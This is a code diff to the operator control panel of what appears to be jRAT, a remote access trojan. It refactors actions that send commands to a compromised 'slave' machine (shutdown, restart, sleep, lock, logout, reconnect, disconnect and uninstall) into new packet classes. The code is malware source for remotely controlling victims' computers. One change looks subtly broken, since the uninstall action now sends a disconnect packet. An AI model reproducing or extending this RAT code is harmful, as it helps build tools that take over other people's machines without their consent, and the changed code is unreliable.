@@ -36,9 +36,15 @@ import org.jrat.project.api.RATControlMenuEntry;
 import com.redpois0n.Constants;
 import com.redpois0n.Script;
 import com.redpois0n.Slave;
-import com.redpois0n.exceptions.CloseException;
 import com.redpois0n.listeners.Performable;
-import com.redpois0n.packets.OutgoingHeader;
+import com.redpois0n.packets.outgoing.Packet11Disconnect;
+import com.redpois0n.packets.outgoing.Packet28ShutdownComputer;
+import com.redpois0n.packets.outgoing.Packet29RestartComputer;
+import com.redpois0n.packets.outgoing.Packet30LogoutComputer;
+import com.redpois0n.packets.outgoing.Packet31ComputerSleep;
+import com.redpois0n.packets.outgoing.Packet32LockComputer;
+import com.redpois0n.packets.outgoing.Packet37RestartJavaProcess;
+import com.redpois0n.packets.outgoing.Packet45Reconnect;
 import com.redpois0n.plugins.Plugin;
 import com.redpois0n.plugins.PluginLoader;
 import com.redpois0n.plugins.RATServerFormat;
@@ -607,7 +613,7 @@ public class FrameControlPanel extends BaseFrame {
 		actions.put("shutdown", new Performable() {
 			public void perform() {
 				if (Util.yesNo("Confirm", "Are you sure you want to shutdown this computer?")) {
-					slave.addToSendQueue(OutgoingHeader.COMPUTER_SHUTDOWN);
+					slave.addToSendQueue(new Packet28ShutdownComputer());
 				}
 			}
 		});
@@ -615,7 +621,7 @@ public class FrameControlPanel extends BaseFrame {
 		actions.put("restart", new Performable() {
 			public void perform() {
 				if (Util.yesNo("Confirm", "Are you sure you want to restart this computer?")) {
-					slave.addToSendQueue(OutgoingHeader.COMPUTER_RESTART);
+					slave.addToSendQueue(new Packet29RestartComputer());
 				}
 			}
 		});
@@ -623,7 +629,7 @@ public class FrameControlPanel extends BaseFrame {
 		actions.put("sleep mode", new Performable() {
 			public void perform() {
 				if (Util.yesNo("Confirm", "Are you sure you want to put this computer in sleep mode?")) {
-					slave.addToSendQueue(OutgoingHeader.COMPUTER_SLEEP);
+					slave.addToSendQueue(new Packet31ComputerSleep());
 				}
 			}
 		});
@@ -631,7 +637,7 @@ public class FrameControlPanel extends BaseFrame {
 		actions.put("lock", new Performable() {
 			public void perform() {
 				if (Util.yesNo("Confirm", "Are you sure you want to lock this computer?")) {
-					slave.addToSendQueue(OutgoingHeader.COMPUTER_LOCK);
+					slave.addToSendQueue(new Packet32LockComputer());
 				}
 			}
 		});
@@ -639,7 +645,7 @@ public class FrameControlPanel extends BaseFrame {
 		actions.put("logout", new Performable() {
 			public void perform() {
 				if (Util.yesNo("Confirm", "Are you sure you want to logout this computer?")) {
-					slave.addToSendQueue(OutgoingHeader.COMPUTER_LOGOUT);
+					slave.addToSendQueue(new Packet30LogoutComputer());
 				}
 			}
 		});
@@ -647,8 +653,7 @@ public class FrameControlPanel extends BaseFrame {
 		actions.put("restart connection", new Performable() {
 			public void perform() {
 				try {
-					slave.addToSendQueue(OutgoingHeader.RESTART_JVM);
-					slave.closeSocket(new CloseException("Restarting connection"));
+					slave.addToSendQueue(new Packet37RestartJavaProcess());
 				} catch (Exception ex) {
 					ex.printStackTrace();
 				}
@@ -658,8 +663,7 @@ public class FrameControlPanel extends BaseFrame {
 		actions.put("reconnect", new Performable() {
 			public void perform() {
 				try {
-					slave.addToSendQueue(OutgoingHeader.RECONNECT);
-					slave.closeSocket(new CloseException("Reconnecting"));
+					slave.addToSendQueue(new Packet45Reconnect());
 				} catch (Exception ex) {
 					ex.printStackTrace();
 				}
@@ -669,8 +673,7 @@ public class FrameControlPanel extends BaseFrame {
 		actions.put("disconnect", new Performable() {
 			public void perform() {
 				try {
-					slave.addToSendQueue(OutgoingHeader.DISCONNECT);
-					slave.closeSocket(new CloseException("Disconnecting"));
+					slave.addToSendQueue(new Packet11Disconnect());
 				} catch (Exception ex) {
 					ex.printStackTrace();
 				}
@@ -681,8 +684,7 @@ public class FrameControlPanel extends BaseFrame {
 			public void perform() {
 				if (Util.yesNo("Confirm", "Confirm uninstalling this server?")) {
 					try {
-						slave.addToSendQueue(OutgoingHeader.UNINSTALL);
-						slave.closeSocket(new CloseException("Uninstalling"));
+						slave.addToSendQueue(new Packet11Disconnect());
 					} catch (Exception ex) {
 						ex.printStackTrace();
 					}
